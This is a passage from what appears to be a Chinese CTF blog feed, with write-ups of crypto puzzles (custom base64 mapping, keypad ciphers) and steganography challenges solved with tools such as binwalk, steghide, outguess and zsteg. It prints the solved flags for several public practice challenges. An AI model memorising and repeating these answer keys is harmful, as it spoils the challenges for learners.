class="string">&#x27;U&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;V&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;H&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">20</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;I&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">27</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">32</span>: <span class="string">&#x27;h&#x27;</span>, <span class="number">33</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;l&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">38</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="number">41</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">42</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">49</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;S&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;p&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">60</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">61</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;+&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;/&#x27;</span>, <span class="number">64</span>: <span class="string">&#x27;=&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">chipertext:</span><br><span class="line">FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// An highlighted block</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">dict=&#123;<span class="number">0</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;O&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;U&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;V&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;H&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">20</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;I&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">27</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">32</span>: <span class="string">&#x27;h&#x27;</span>,<span class="number">33</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;l&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">38</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="number">41</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">42</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">49</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;S&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;p&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">60</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">61</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;+&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;/&#x27;</span>, <span class="number">64</span>: <span class="string">&#x27;=&#x27;</span>&#125;</span><br><span class="line">base64_list = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]</span><br><span class="line">cipher=<span class="string">&#x27;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span>(dict[j]==cipher[i]):</span><br><span class="line">            res+=base64_list[j]</span><br><span class="line">print(res)</span><br><span class="line">flag=base64.b64decode(res)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#b&#x27;BJD&#123;D0_Y0u_kNoW_Th1s_b4se_map&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="NCTF2019-Keyboard"><a href="#NCTF2019-Keyboard" class="headerlink" title="[NCTF2019]Keyboard"></a>[NCTF2019]Keyboard</h2><p>提示键盘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee</span><br></pre></td></tr></table></figure><p>本想着是键盘密码，但是发现好多重复的，想到手机键盘，尝试python解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strr = <span class="string">&quot;ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee&quot;</span>.split()</span><br><span class="line">all = &#123;<span class="string">&#x27;none1&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;none2&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;w&#x27;</span>:<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;e&#x27;</span>:<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;r&#x27;</span>:<span class="string">&#x27;ghi&#x27;</span>,<span class="string">&#x27;t&#x27;</span>:<span class="string">&#x27;jkl&#x27;</span>,<span class="string">&#x27;y&#x27;</span>:<span class="string">&#x27;mno&#x27;</span>,<span class="string">&#x27;u&#x27;</span>:<span class="string">&#x27;pors&#x27;</span>,<span class="string">&#x27;i&#x27;</span>:<span class="string">&#x27;tuv&#x27;</span>,<span class="string">&#x27;o&#x27;</span>:<span class="string">&#x27;wxyz&#x27;</span>&#125;</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">    flag+=all[i[<span class="number">0</span>]][len(i)<span class="number">-1</span>]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-keyboard"><a href="#MRCTF2020-keyboard" class="headerlink" title="[MRCTF2020]keyboard"></a>[MRCTF2020]keyboard</h2><p>重复的次数就是每个键盘上的字母。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">得到的flag用</span><br><span class="line">MRCTF&#123;xxxxxx&#125;形式上叫</span><br><span class="line">都为小写字母</span><br><span class="line"></span><br><span class="line">6</span><br><span class="line">666</span><br><span class="line">22</span><br><span class="line">444</span><br><span class="line">555</span><br><span class="line">33</span><br><span class="line">7</span><br><span class="line">44</span><br><span class="line">666</span><br><span class="line">66</span><br><span class="line">3</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BUUCTF-Crypto&quot;&gt;&lt;a href=&quot;#BUUCTF-Crypto&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF-Crypto&quot;&gt;&lt;/a&gt;BUUCTF-Crypto&lt;/h1&gt;&lt;p&gt;MD5&lt;/p&gt;
&lt;p&gt;直接解密得到admin1&lt;/p</summary>
      
    
    
    
    <category term="CTF-密码" scheme="http://s1eady.top/categories/CTF-%E5%AF%86%E7%A0%81/"/>
    
    
    <category term="CTF-密码" scheme="http://s1eady.top/tags/CTF-%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>CTF-杂项刷题2</title>
    <link href="http://s1eady.top/2020/10/16/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%981/"/>
    <id>http://s1eady.top/2020/10/16/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%981/</id>
    <published>2020-10-15T18:20:17.000Z</published>
    <updated>2020-11-06T11:55:58.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="中国移动"><a href="#中国移动" class="headerlink" title="中国移动"></a>中国移动</h1><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><h3 id="SYN01-powpow"><a href="#SYN01-powpow" class="headerlink" title="SYN01 powpow"></a>SYN01 powpow</h3><p>拿到一个mp4文件，首先想到分帧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i flag.mp4 -f image2 image%d.jpg</span><br></pre></td></tr></table></figure><p>拿到200+图片，但是查看图片没有什么异常，查看文件属性，有一串base64，解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;steghide.sourceforge.net&#x2F;</span><br></pre></td></tr></table></figure><p>提示steghide，但是该工具只能使用jpg，想到分离出来的jpg，但是文件太多也不现实。直接binwalk分析MP4</p><p>文件。</p><p>藏有一个png，使用工具将png转化为jpg，然后使用steghide，密码为password。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stepic -d -i image.png  &gt; image.jpg</span><br><span class="line">steghide extract -sf image.jpg -p password</span><br><span class="line">wrote extracted data to &quot;base64.txt&quot;</span><br></pre></td></tr></table></figure><p>python base85拿到flag。</p><h3 id="SYN03-binwalk"><a href="#SYN03-binwalk" class="headerlink" title="SYN03 binwalk"></a>SYN03 binwalk</h3><p>提示binwalk，直接分离分离出两张图片，盲水印、compare、stegsolve都试过了，然后最后<code>zsteg</code>拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8,bgr,msb,yX,prime .. text: &quot;~r0&gt;2Paj()z&quot;</span><br><span class="line">b1,r,lsb,xY         .. text: &quot;ISG&#123;E4sY_StEg4n0gR4pHy&#125;&quot;</span><br><span class="line">b2,r,lsb,xY         .. text: &quot;&gt;PUUUUUUUU&quot;</span><br><span class="line">b2,g,msb,xY         .. file: BIOS (ia32) ROM Ext. (252*512)</span><br></pre></td></tr></table></figure><p>可以看到在r的0通道拿到flag。所以直接<code>stegsolve</code>的<code>data extract</code>。</p><h3 id="SYN02-Easy-stegano"><a href="#SYN02-Easy-stegano" class="headerlink" title="SYN02 Easy_stegano"></a>SYN02 Easy_stegano</h3><p>拿到一个gif，本能的分离，分离出三张图片发现没有太大的信息。直接binwalkgif。分理处一个压缩包，解压一共六个文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ ls</span><br><span class="line">1.png  2.jpg  3.jpg  4.jpg  5.jpg  6.jpg  strange_file.png</span><br></pre></td></tr></table></figure><p>挨个文件查看。</p><p>第一个，在文件的最后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings 1.png </span><br><span class="line">tvUZIHDQ</span><br><span class="line">IEND</span><br><span class="line">Lets begin:</span><br><span class="line">3tKdX</span><br></pre></td></tr></table></figure><p>第二个提示另一种方式，使用outguess，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings 2.jpg</span><br><span class="line">Di$60</span><br><span class="line">WM(&amp;</span><br><span class="line">Dont be stupid</span><br><span class="line">Use another method</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady/<span class="number">1</span>$ outguess -r <span class="number">2.j</span>pg out &amp;&amp; cat out</span><br><span class="line">Reading <span class="number">2.j</span>pg....</span><br><span class="line">Extracting usable bits:   <span class="number">2315</span> bits</span><br><span class="line">Steg retrieve: seed: <span class="number">32</span>, len: <span class="number">16</span></span><br><span class="line">N0LWF</span><br><span class="line">Dont stop</span><br></pre></td></tr></table></figure><p>第三章图片，查看有PK字段，binwalk分离，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings 3.jpg</span><br><span class="line">994PK</span><br><span class="line">995PK</span><br><span class="line">996PK</span><br><span class="line">997PK</span><br><span class="line">998PK</span><br><span class="line">999PK</span><br></pre></td></tr></table></figure><p>拿到许多文件，文件都在压缩包内，查看CRC是不是有不同的，其中一个名字为386的文件的CRC与别的不一样。也可以计算文件的md5，可以看到文件386的md5与其他文件不一样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;zip&#x2F;_3.jpg.extracted$ md5sum * | sort -k1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;368</span><br><span class="line">GoOd 3RlZ30&#x3D;</span><br></pre></td></tr></table></figure><p>第四个exitfool工具,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady/<span class="number">1</span>$ exiftool /home/steady/桌面/steady/<span class="number">1</span>/<span class="number">4.j</span>pg</span><br><span class="line">ExifTool Version Number         : <span class="number">12.07</span></span><br><span class="line">File Name                       : <span class="number">4.j</span>pg</span><br><span class="line">Directory                       : /home/steady/桌面/steady/<span class="number">1</span></span><br><span class="line">File Size                       : <span class="number">6.9</span> kB</span><br><span class="line">File Modification Date/Time     : <span class="number">2015</span>:<span class="number">01</span>:<span class="number">18</span> <span class="number">21</span>:<span class="number">14</span>:<span class="number">24</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Access Date/Time           : <span class="number">2020</span>:<span class="number">11</span>:<span class="number">03</span> <span class="number">14</span>:<span class="number">23</span>:<span class="number">47</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Inode Change Date/Time     : <span class="number">2020</span>:<span class="number">11</span>:<span class="number">03</span> <span class="number">14</span>:<span class="number">23</span>:<span class="number">45</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Permissions                : rwxrw-rw-</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : <span class="number">1.01</span></span><br><span class="line">Resolution Unit                 : <span class="literal">None</span></span><br><span class="line">X Resolution                    : <span class="number">1</span></span><br><span class="line">Y Resolution                    : <span class="number">1</span></span><br><span class="line">Exif Byte Order                 : Little-endian (Intel, II)</span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line">Artist                          : If you insist here <span class="keyword">is</span> your gift: ZmxhZ</span><br><span class="line">Comment                         : </span><br><span class="line">Image Width                     : <span class="number">187</span></span><br><span class="line">Image Height                    : <span class="number">186</span></span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : <span class="number">8</span></span><br><span class="line">Color Components                : <span class="number">3</span></span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:<span class="number">2</span>:<span class="number">0</span> (<span class="number">2</span> <span class="number">2</span>)</span><br><span class="line">Image Size                      : <span class="number">187</span>x186</span><br><span class="line">Megapixels                      : <span class="number">0.035</span></span><br></pre></td></tr></table></figure><p>第五个，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings  &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1&#x2F;5.jpg</span><br><span class="line">&#x3D;Bvz</span><br><span class="line">;&#x3D;Bvz</span><br><span class="line">9!Y$</span><br><span class="line">So easy</span><br><span class="line">Just Look Carefully</span><br></pre></td></tr></table></figure><p>仔细看图片图片上有<code>TaU1w</code>。</p><p>第六个，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings  &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1&#x2F;6.jpg</span><br><span class="line">Here is your last gift</span><br><span class="line">TGUtU</span><br><span class="line">Now form the flag :)</span><br></pre></td></tr></table></figure><p>最后把字符串组成一组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;3tKdX&quot;,&quot;N0LWF&quot;,&quot;ZmxhZ&quot;,&quot;TaU1w&quot;,&quot;TGUtU&quot;，&quot;3RlZ30&#x3D;&quot;]</span><br></pre></td></tr></table></figure><p>组合起来是<code>3tKdXN0LWF3RlZ30=ZmxhZTGUtU</code>，不是一个正常的base64，想到栅栏，把=号移动到最后面但是最终还是没拿到flag。观察这几串字符，被分成几块，而且=号这一块一定是在最后面的，所以flag很可能就是这几个块随机组合。所以上python脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">d = [<span class="string">&quot;3tKdX&quot;</span>,<span class="string">&quot;N0LWF&quot;</span>,<span class="string">&quot;ZmxhZ&quot;</span>,<span class="string">&quot;TaU1w&quot;</span>,<span class="string">&quot;TGUtU&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> itertools.permutations(d):</span><br><span class="line">        print(b64decode(<span class="string">&#x27;&#x27;</span>.join(x) + <span class="string">&quot;3RlZ30=&quot;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1&#x2F;1.py | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure><p>最后拿到flag。</p><h3 id="slowed"><a href="#slowed" class="headerlink" title="slowed"></a>slowed</h3><p>题目提示slow，打开之后听音乐，发现很慢，使用sox变快一点<code>steady@steady:~/桌面/steady$ sox slowed.wav fast.wav speed 3.2</code>。</p><p>听到了字母的语音。使用Audacity查看频谱图，发现频谱图中有数据，通过修改频率也是看不清，直接使用sox。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sox slowed.wav -n spectrogram</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/58.png" alt="58"></p><p>可以看到不太清楚，直接使用sox再次优化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sox slowed.wav -n spectrogram -z 30 -Z -20 -x 1600</span><br></pre></td></tr></table></figure><p>最后拿到一个下载地址。</p><h2 id="其他隐写"><a href="#其他隐写" class="headerlink" title="其他隐写"></a>其他隐写</h2><h3 id="FRA05-syclovergeek"><a href="#FRA05-syclovergeek" class="headerlink" title="FRA05 syclovergeek"></a>FRA05 syclovergeek</h3><p>MP3隐写，文件名字就是密码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 